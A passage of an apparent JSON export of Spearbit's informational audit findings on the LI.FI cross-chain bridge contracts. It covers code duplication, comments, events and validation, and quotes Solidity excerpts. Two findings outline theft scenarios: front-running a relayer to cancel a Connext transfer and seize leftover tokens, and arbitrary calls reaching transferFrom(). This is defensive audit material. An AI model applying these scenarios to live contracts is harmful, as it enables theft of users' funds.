        "body": "A large part of the function _withdrawAsset() is very similar to LibAsset.transferAsset(). function _withdrawAsset(...) ... { ... if (_assetAddress == NATIVE_ASSET) { address self = address(this); if (_amount > self.balance) revert NotEnoughBalance(_amount, self.balance); (bool success, ) = payable(sendTo).call{ value: _amount }(\"\"); if (!success) revert WithdrawFailed(); } else { assetBalance = IERC20(_assetAddress).balanceOf(address(this)); if (_amount > assetBalance) revert NotEnoughBalance(_amount, assetBalance); SafeERC20.safeTransfer(IERC20(_assetAddress), sendTo, _amount); } ... }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "anySwapOut() doesnt lower allowance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The function anySwapOut() only seems to work with Anyswap tokens. It burns the received to- kens here: AnyswapV5Router.sol#L334 This burning doesnt use/lower the allowance, so the allowance will stay present. Also see howto: function anySwapOut ==> no need to approve. function _startBridge(...) ... { ... LibAsset.maxApproveERC20(IERC20(underlyingToken), _anyswapData.router, _anyswapData.amount); ... IAnyswapRouter(_anyswapData.router).anySwapOut(...); }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Anyswap rebrand",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Anyswap is rebranded to Multichain see rebrand.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Check processing of native tokens in AnyswapFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The variable isNative seems to mean a wrapped native token is used (see function _getUnderly- ingToken() ). Currently startBridgeTokensViaAnyswap() skips LibAsset.depositAsset() when isNative == true, but a wrapped native tokens should also be moved via LibAsset.depositAsset(). Also _startBridge() tries to send native tokens with { value: _anyswapData.amount } then isNative == true, but this wouldnt work with wrapped tokens. The Howto seems to indicate an approval (of the wrapped native token) is neccesary. 52 contract AnyswapFacet is ILiFi, SwapperV2, ReentrancyGuard { ,! ,! function startBridgeTokensViaAnyswap(LiFiData calldata _lifiData, AnyswapData calldata _anyswapData) ... { { // Multichain (formerly Anyswap) tokens can wrap other tokens (address underlyingToken, bool isNative) = _getUnderlyingToken(_anyswapData.token, _anyswapData.router); if (!isNative) LibAsset.depositAsset(underlyingToken, _anyswapData.amount); ... } function _getUnderlyingToken(address token, address router) ... { ... if (token == address(0)) revert TokenAddressIsZero(); underlyingToken = IAnyswapToken(token).underlying(); // The native token does not use the standard null address ID isNative = IAnyswapRouter(router).wNATIVE() == underlyingToken; // Some Multichain complying tokens may wrap nothing if (!isNative && underlyingToken == address(0)) { underlyingToken = token; } } function _startBridge(... ) ... { ... if (isNative) { IAnyswapRouter(_anyswapData.router).anySwapOutNative{ value: _anyswapData.amount }(...); // ,! send native tokens } ... } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove payable in swapAndCompleteBridgeTokensViaStargate()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "There are 2 versions of sgReceive() / completeBridgeTokensViaStargate() which use different locations for nonReentrant The function swapAndCompleteBridgeTokensViaStargate of Executor is payable but doesnt receive native to- kens. 53 contract Executor is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi { function sgReceive(...) external { // not payable ... this.swapAndCompleteBridgeTokensViaStargate(lifiData, swapData, assetId, payable(receiver)); // ,! doesn't send native assets ... } function swapAndCompleteBridgeTokensViaStargate(...) external payable nonReentrant { // is payable if (msg.sender != address(this)) { revert InvalidCaller(); } } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use the same order for inherited contracts.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The inheritance of contract isnt always done in the same order. For code consistency its best to always put them in the same order. contract AmarokFacet contract AnyswapFacet contract ArbitrumBridgeFacet contract CBridgeFacet contract GenericSwapFacet contract GnosisBridgeFacet contract HopFacet contract HyphenFacet contract NXTPFacet contract OmniBridgeFacet contract OptimismBridgeFacet contract PolygonBridgeFacet contract StargateFacet contract GenericBridgeFacet contract WormholeFacet contract AcrossFacet contract Executor is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, SwapperV2, ReentrancyGuard { is ILiFi, ReentrancyGuard { is ILiFi, ReentrancyGuard, Swapper { is ILiFi, ReentrancyGuard, SwapperV2 { is IAxelarExecutable, Ownable, ReentrancyGuard, ILiFi {",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Catch potential revert in swapAndStartBridgeTokensViaStargate()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The following statement nativeFee -= _swapData[i].fromAmount; can revert in the swapAnd- StartBridgeTokensViaStargate(). function swapAndStartBridgeTokensViaStargate(...) ... { ... for (uint8 i = 0; i < _swapData.length; i++) { if (LibAsset.isNativeAsset(_swapData[i].sendingAssetId)) { nativeFee -= _swapData[i].fromAmount; // can revert } } ... }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "No need to use library If It is in the same file",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "On the LibAsset, some of the functions are called through LibAsset., however there is no need to call because the functions are in the same solidity file. ... ... if (msg.value != 0) revert NativeValueWithERC(); uint256 _fromTokenBalance = LibAsset.getOwnBalance(tokenId); LibAsset.transferFromERC20(tokenId, msg.sender, address(this), amount); if (LibAsset.getOwnBalance(tokenId) - _fromTokenBalance != amount) revert InvalidAmount();",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Combined Optimism and Synthetix bridge",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The Optimism bridge also includes a specific bridge for Synthetix tokens. Perhaps it is more clear to have a seperate Facet for this. function _startBridge(...) ... { ... if (_bridgeData.isSynthetix) { bridge.depositTo(_bridgeData.receiver, _amount); } else { ... } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Doublecheck the Diamond pattern",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The LiFi protocol uses the diamond pattern. This pattern is relative complex and has overhead for the delegatecall. There is not much synergy between the different bridges (except for access controls & white lists). By combining all the bridges in one contract, the risk of one bridge might have an influence on another bridge.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Reference Diamond standard",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The LiFiDiamond.sol contract doesnt contain a reference to the Diamond contract. Having that would make it easier for readers of the code to find the origin of the contract.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Validate Nxtp InvariantTransactionData",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "During the code review, It has been noticed that InvariantTransactionDatas fields are not validated. Even if the validation located in the router, sendingChainFallback and receivingAddress parameters are sensible and connext does not have meaningful error message on these parameter validation. Also, router parameter does not have any validation. Most of the other facets have. For instance : Amarok Facet Note: also see issue \"Hardcode bridge addresses via immutable\" function _startBridge(NXTPData memory _nxtpData) private returns (bytes32) { ITransactionManager txManager = ITransactionManager(_nxtpData.nxtpTxManager); IERC20 sendingAssetId = IERC20(_nxtpData.invariantData.sendingAssetId); // Give Connext approval to bridge tokens LibAsset.maxApproveERC20(IERC20(sendingAssetId), _nxtpData.nxtpTxManager, _nxtpData.amount); uint256 value = LibAsset.isNativeAsset(address(sendingAssetId)) ? _nxtpData.amount : 0; // Initiate bridge transaction on sending chain ITransactionManager.TransactionData memory result = txManager.prepare{ value: value }( ITransactionManager.PrepareArgs( _nxtpData.invariantData, _nxtpData.amount, _nxtpData.expiry, _nxtpData.encryptedCallData, _nxtpData.encodedBid, _nxtpData.bidSignature, _nxtpData.encodedMeta ) ); return result.transactionId; }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Executor contract should not handle cross-chain swap from Connext",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The Executor contract is designed to handle a swap at the destination chain. The LIFI protocol may build a cross-chain transaction to call Executor.swapAndCompleteBridgeTokens at the destination chain. In order to do a flexible swap, the Executor can perform arbitrary execution. Executor.sol#L323-L333 57 function _executeSwaps( LiFiData memory _lifiData, LibSwap.SwapData[] calldata _swapData, address payable _receiver ) private noLeftovers(_swapData, _receiver) { for (uint256 i = 0; i < _swapData.length; i++) { if (_swapData[i].callTo == address(erc20Proxy)) revert UnAuthorized(); // Prevent calling ,! ERC20 Proxy directly LibSwap.SwapData calldata currentSwapData = _swapData[i]; LibSwap.swap(_lifiData.transactionId, currentSwapData); } } However, the receiver address is a privileged address in some bridging services. Allowing users to do arbitrary execution/ external calls is dangerous. The Connext protocol is an example : Connext contractAPI#cancel The receiver address can prematurely cancel a cross-chain transaction. When a cross-chain execution is canceled, the funds would be sent to the fallback address without executing the external call. Exploiters can front-run a gelato relayer and cancel a cross-chain execution. The (post-swap) tokens will be sent to the receivers address. The exploiters can grab the tokens left in the Executor in the same transaction.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Avoid using strings in the interface of the Axelar Facet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The Axelar Facet uses strings to indicate the destinationChain, destinationAddress, which is different then on other bridge facets. function executeCallWithTokenViaAxelar( string memory destinationChain, string memory destinationAddress, string memory symbol, ... ) ...{ } The contract address is (or at least can be) encoded as a hex string, as seen in this example: /// https://etherscan.io/tx/0x7477d550f0948b0933cf443e9c972005f142dfc5ef720c3a3324cefdc40ecfa2 # 0 1 2 3 4 Type Name destinationChain string destinationContractAddress payload symbol amount bytes string uint256 50000000 0xA57ADCE1d2fE72949E4308867D894CD7E7DE0ef2 Data binance string USDC 58 The Axelar bridge allows bridging to non EVM chains, however the LiFi protocol doesnt seem to support thus. So its good to prevent accidentally sending to non EVM chains. Here are the supported non EVM chains: non-evm- networks The Axelar interface doesnt have a (compatible) emit.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Hardcode source Nomad domain ID via immutable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "AmarokFacet takes source domain ID as a user parameter and passes it to the bridge: originDomain: _bridgeData.srcChainDomain User provided can be incorrect, and Connext will later revert the transaction. See BridgeFacet.sol#L319-L321: if (_args.params.originDomain != s.domain) { revert BridgeFacet__xcall_wrongDomain(); }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Amount swapped not emitted",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The emits LiFiTransferStarted() and LiFiTransferCompleted() dont emit the amount after the swap (e.g. the real amount that is being bridged / transferred to the receiver). This might be useful to add. 59 event LiFiTransferStarted( bytes32 indexed transactionId, string bridge, string bridgeData, string integrator, address referrer, address sendingAssetId, address receivingAssetId, address receiver, uint256 amount, uint256 destinationChainId, bool hasSourceSwap, bool hasDestinationCall ); event LiFiTransferCompleted( bytes32 indexed transactionId, address receivingAssetId, address receiver, uint256 amount, uint256 timestamp );",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Comment is not compatible with code",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "On the HyphenFacet, Comment is mentioned that approval is given to Anyswap. But, approval is given to Hyphen router. function _startBridge(HyphenData memory _hyphenData) private { // Check chain id if (block.chainid == _hyphenData.toChainId) revert CannotBridgeToSameNetwork(); if (_hyphenData.token != address(0)) { // Give Anyswap approval to bridge tokens LibAsset.maxApproveERC20(IERC20(_hyphenData.token), _hyphenData.router, _hyphenData.amount); }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Move whitelist to LibSwap.swap()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The function LibSwap.swap() is dangerous because it can call any function of any contract. If this is exposed to the outside (like in GenericBridgeFacet), is might enable access to transferFrom() and thus stealing tokens. Also see issue \"Too generic calls in GenericBridgeFacet allow stealing of tokens\" Luckily most of the time LibSwap.swap() is called via _executeSwaps(), which has a whitelist and reduces the risk. To improve security it would be better to integrate the whitelists in LibSwap.swap(). Note: also see issue \"_executeSwaps of Executor.sol doesnt have a whitelist\" library LibSwap { function swap(bytes32 transactionId, SwapData calldata _swapData) internal { if (!LibAsset.isContract(_swapData.callTo)) revert InvalidContract(); ... (bool success, bytes memory res) = _swapData.callTo.call{ value: nativeValue ,! }(_swapData.callData); ... } } contract SwapperV2 is ILiFi { function _executeSwaps(...) ... { ... if ( !(appStorage.dexAllowlist[currentSwapData.approveTo] && appStorage.dexAllowlist[currentSwapData.callTo] && appStorage.dexFuncSignatureAllowList[bytes32(currentSwapData.callData[:8])]) ) revert ContractCallNotAllowed(); LibSwap.swap(_lifiData.transactionId, currentSwapData); } } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Redundant check on the HyphenFacet",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "In the HyphenFacet, there is a condition which checks source chain is different than destination chain id. However, the conditional check is already placed on the Hyphen contracts. _depositErc20, _depositNative) function _startBridge(HyphenData memory _hyphenData) private { // Check chain id if (block.chainid == _hyphenData.toChainId) revert CannotBridgeToSameNetwork(); }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Check input amount equals swapped amount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The bridge functions dont check that input amount ( _bridgeData.amount or msg.value) is equal to the swapped amount (_swapData[0].fromAmount). This could lead to funds remaining in the LiFi Diamond or Executor. Luckily noLeftovers() or checks on startingBalance solve this by sending the remaining balance to the origina- tor or receiver. However this is fixing symptoms instead of preventing the issue. function swapAndStartBridgeTokensViaOmniBridge( ... LibSwap.SwapData[] calldata _swapData, BridgeData calldata _bridgeData ) ... { ... uint256 amount = _executeAndCheckSwaps(_lifiData, _swapData, payable(msg.sender)); ... }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use same layout for facets",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The different bridge facets use different layouts for the source code. This can be seen at the call to _startBridge(). The code is easier to maintain If it is the same everywhere. 62 AmarokFacet.sol: ArbitrumBridgeFacet.sol: OmniBridgeFacet.sol: OptimismBridgeFacet.sol: PolygonBridgeFacet.sol: StargateFacet.sol: AcrossFacet.sol: CBridgeFacet.sol: GenericBridgeFacet.sol: GnosisBridgeFacet.sol: HopFacet.sol: HyphenFacet.sol: NXTPFacet.sol: AnyswapFacet.sol: WormholeFacet.sol: AxelarFacet.sol: _startBridge(_lifiData, _bridgeData, amount, true); _startBridge(_lifiData, _bridgeData, amount, true); _startBridge(_lifiData, _bridgeData, amount, true); _startBridge(_lifiData, _bridgeData, amount, true); _startBridge(_lifiData, _bridgeData, true); _startBridge(_stargateData, _lifiData, nativeFee, true); _startBridge(_acrossData); _startBridge(_cBridgeData); _startBridge(_bridgeData); _startBridge(gnosisBridgeData); _startBridge(_hopData); _startBridge(_hyphenData); _startBridge(_nxtpData); _startBridge(_anyswapData, underlyingToken, isNative); _startBridge(_wormholeData); // no _startBridge",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Safety check is missing on the remaining amount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "On the FeeCollector contract, There is no safety check to ensure remaining amount doesnt under- flow and revert. function collectNativeFees( uint256 integratorFee, uint256 lifiFee, address integratorAddress ) external payable { ... ... } uint256 remaining = msg.value - (integratorFee + lifiFee);",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Entire struct can be emitted",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The emit LiFiTransferStarted() generally outputs the entire struct _lifiData by specifying all Its also possible to emit the entire struct in one go. This would make the code smaller and fields of the struct. easier to maintain. function _startBridge(LiFiData calldata _lifiData, ... ) ... { ... // do actions emit LiFiTransferStarted( _lifiData.transactionId, \"omni\", \"\", _lifiData.integrator, _lifiData.referrer, _lifiData.sendingAssetId, _lifiData.receivingAssetId, _lifiData.receiver, _lifiData.amount, _lifiData.destinationChainId, _hasSourceSwap, false ); }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Redundant return value from internal function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Callers of NXTPFacet._startBridge() function never use its return value.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Change comment on the LibAsset",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The following comment is used in the LibAsset.sol contract. However, Connext doesnt have this file anymore and deleted with the following commit. /// @title LibAsset /// @author Connext <support@connext.network> /// @notice This library contains helpers for dealing with onchain transfers /// /// library LibAsset {} of assets, including accounting for the native asset `assetId` conventions and any noncompliant ERC20 transfers",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Integrate all variants of _executeAndCheckSwaps()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "There are multiple functions that are more or less the same:  swapAndCompleteBridgeTokensViaStargate() of Executor.sol  swapAndCompleteBridgeTokens() of Executor.sol  swapAndExecute() of Executor.sol  _executeAndCheckSwaps() of SwapperV2.sol  _executeAndCheckSwaps() of Swapper.sol  swapAndCompleteBridgeTokens() of XChainExecFacet As these are important functions it is worth the trouble to have one code base to maintain. For example swapAnd- CompleteBridgeTokens() doesnt check msg.value ==0 when ERC20 tokens are send. Note: swapAndCompleteBridgeTokensViaStargate() of StargateFacet.sol already uses SwapperV2.sol",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Utilize NATIVE_ASSETID constant from LibAsset",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "In the codebase, LibAsset library contains the variable which defines zero address. However, on the facets the check is repeated. Code should not be repeated and its better to have one version used everywhere to reduce likelihood of bugs. contract AcrossFacet { address internal constant ZERO_ADDRESS = 0x0000000000000000000000000000000000000000; } contract DexManagerFacet { if (_dex == 0x0000000000000000000000000000000000000000) } contract WithdrawFacet { address private constant NATIVE_ASSET = 0x0000000000000000000000000000000000000000; ... } address sendTo = (_to == address(0)) ? msg.sender : _to;",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Native matic will be treated as ERC20 token",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "LiFi supports Polygon on their implementation. However, Native MATIC on the Polygon has the contract 0x0000000000000000000000000000000000001010 address. Even if, It does not pose any risk, Native Matic will be treated as an ERC20 token. contract WithdrawFacet { address private constant NATIVE_ASSET = 0x0000000000000000000000000000000000000000; // address(0) ...",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Multiple versions of noLeftovers modifier",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The modifier noLeftovers is defined in 3 different files: Swapper.sol, SwapperV2.sol and Ex- ecutor.sol. While the versions on Swapper.sol and Executor.sol are the same, they differ with the one in Executor.sol. Assuming the recommendation for \"Processing of end balances\" is followed, the only difference is that noLeftovers in SwapperV2.sol doesnt revert when new balance is less than initial balance. Code should not be repeated and its better to have one version used everywhere to reduce likelihood of bugs.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Reduce unchecked scope",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Both zapIn() functions in FusePoolZap.sol operate in unchecked block which means any contained arithmetic can underflow or overflow. Currently, it effects only one line in both functions:  FusePoolZap.sol#L67: uint256 mintAmount = IERC20(address(fToken)).balanceOf(address(this)) - preMintBalance;  FusePoolZap.sol#L104 mintAmount = mintAmount - preMintBalance; Having unchecked for such a large scope when it is applicable to only one line is dangerous.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "No event exists for core paths/functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Several key actions are defined without event declarations. Owner only functions that change critical parameters can emit events to record these changes on-chain for off-chain monitors/tools/interfaces. There are 4 instances of this issue: 67 contract PeripheryRegistryFacet { function registerPeripheryContract(...) ... { } } contract LibAccess { function addAccess(...) ... { } function removeAccess(...) ... { } } contract AccessManagerFacet { function setCanExecute(...) ... { } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rename _receiver to _leftoverReceiver",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "In the contracts Swapper.sol, SwapperV2.sol and Executor.sol the parameter _receiver is used in various places. Its name seems to suggest that the result of the swapped tokens are send to the _receiver, however this is not the case. Instead the left over tokens are send to the _receiver. This makes the code more difficult to read and maintain. contract SwapperV2 is ILiFi { modifier noLeftovers(..., address payable _receiver) { ... } function _executeAndCheckSwaps(..., address payable _receiver) ... { ... } function _executeSwaps(..., address payable _receiver) ... { ... } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Native tokens dont need SwapData.approveTo",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The functions _executeSwaps() of both SwapperV2.sol and Swapper.sol use a whitelist to make sure the right functions in the allowed dexes are called. These checks also include a check on approveTo, however approveTo is not relevant when a native token is being used. Currently the caller of the Lifi Diamond has to specify a whitelisted currentSwapData.approveTo to be able to execute _executeSwaps() which doesnt seem logical. Present in both SwapperV2.sol and Swapper.sol: function _executeSwaps(...) ... { ... if ( !(appStorage.dexAllowlist[currentSwapData.approveTo] && appStorage.dexAllowlist[currentSwapData.callTo] && appStorage.dexFuncSignatureAllowList[bytes32(currentSwapData.callData[:8])]) ) revert ContractCallNotAllowed(); LibSwap.swap(_lifiData.transactionId, currentSwapData); } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inaccurate comment on the maxApproveERC20() function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "During the code review, It has been observed that comment is incompatible with the functionality. maxApproveERC20 function approves MAX If asset id does not have sufficient allowance. The comment can be replaced with If a sufficient allowance is not present, the allowance is set to MAX. /// @notice Gives MAX approval for another address to spend tokens /// @param assetId Token address to transfer /// @param spender Address to give spend approval to /// @param amount Amount to approve for spending function maxApproveERC20( IERC20 assetId, address spender, uint256 amount )",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Undocumented contracts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "All systematic contracts are documented on the docs directory. However, several contracts are not documented. LiFi is integrated with third party platforms through API. To understand code functionality, the related contracts should be documented in the directory.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Utilize built-in library function on the address check",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "In the codebase, LibAsset library contains the function which determines whether the given assetId is the native asset. However, this check is not used and many of the other contracts are applying address check seperately. contract AmarokFacet { function startBridgeTokensViaAmarok(...) ... { ... if (_bridgeData.assetId == address(0)) ... } function swapAndStartBridgeTokensViaAmarok(... ) ... { ... if (_bridgeData.assetId == address(0)) ... } } contract AnyswapFacet { function swapAndStartBridgeTokensViaAnyswap(...) ... { ... if (_anyswapData.token == address(0)) revert TokenAddressIsZero(); ... } } contract HyphenFacet { function _startBridge(...) ... { ... if (_hyphenData.token != address(0)) ... } } contract StargateFacet { function _startBridge(...) ... { ... if (token == address(0)) ... 70 } } contract LibAsset { function transferFromERC20(...) ... { ... if (assetId == NATIVE_ASSETID) revert NullAddrIsNotAnERC20Token(); ... } function transferAsset(...) ... { ... (assetId == NATIVE_ASSETID) ... } }",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider using wrapped native token",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "The code currently supports bridging native tokens. However this has the following drawbacks:  not every bridge supports native tokens;  native tokens have an inherent risk of reentrancy;  native tokens introduce additional code paths, which is more difficult to maintain and results in a higher risk of bugs. Also wrapped tokens are more composable. This is also useful for bridges that currently dont support native tokens like the AxelarFacet, the WormholeFacet, and the StargateFacet.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect event emitted",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Li.fi follows a two-step ownership transfer pattern, where the current owner first proposes an address to be the new owner. Then that address accepts the ownership in a different transaction via confirmOwnership- Transfer(): function confirmOwnershipTransfer() external { if (msg.sender != pendingOwner) revert NotPendingOwner(); owner = pendingOwner; pendingOwner = LibAsset.NULL_ADDRESS; emit OwnershipTransferred(owner, pendingOwner); } At the time of emitting OwnershipTransferred, pendingOwner is always address(0) and owner is the new owner. This event should be used to log the addresses between which the ownership transfer happens.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "If statement does not check mintAmount properly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "On the zapIn function, mintAmount is checked with the following If statement. However, It is directly getting contract balance instead of taking difference between mintAmount and preMintBalance. ... ... uint256 mintAmount = IERC20(address(fToken)).balanceOf(address(this)); if (!success && mintAmount == 0) { revert MintingError(res); } mintAmount = mintAmount - preMintBalance;",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use address(0) for zero address",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Its better to use shorthands provided by Solidity for popular constant values to improve readability and likelihood of errors. address internal constant NULL_ADDRESS = 0x0000000000000000000000000000000000000000; //address(0)",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Better variable naming",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "MAX_INT is defined to be the maximum value of uint256 data type: uint256 private constant MAX_INT = type(uint256).max; This variable name can be interpreted as the maximum value of int256 data type which is lower than type(uint256).max.",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Event is missing indexed fields",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LIFI-Spearbit-Security-Review.pdf",
        "body": "Index event fields make the field more quickly accessible to off-chain tools that parse events. How- ever, note that each index field costs extra gas during emission, so its not necessarily best to index the maximum allowed per event (three fields).",
        "labels": [
            "Spearbit",
            "LIFI",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove misleading comment",
